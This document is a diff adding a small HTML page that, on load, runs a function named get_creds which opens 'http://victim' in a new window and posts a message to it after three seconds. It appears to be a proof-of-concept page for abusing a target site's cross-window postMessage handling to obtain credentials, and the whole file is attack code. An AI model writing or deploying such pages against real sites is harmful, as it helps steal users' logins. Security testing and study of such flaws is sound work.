@@ -1,0 +1,17 @@
+<html>
+    <body onload="get_creds()">
+        
+        <script>
+            
+            function get_creds(){
+                var nw = window.open('http://victim','_blank')
+                setTimeout(function() {
+                    nw.postMessage('message', 'handler');
+                    }, 3000);
+
+                
+            }
+        </script>
+    </body>
+    
+</html>
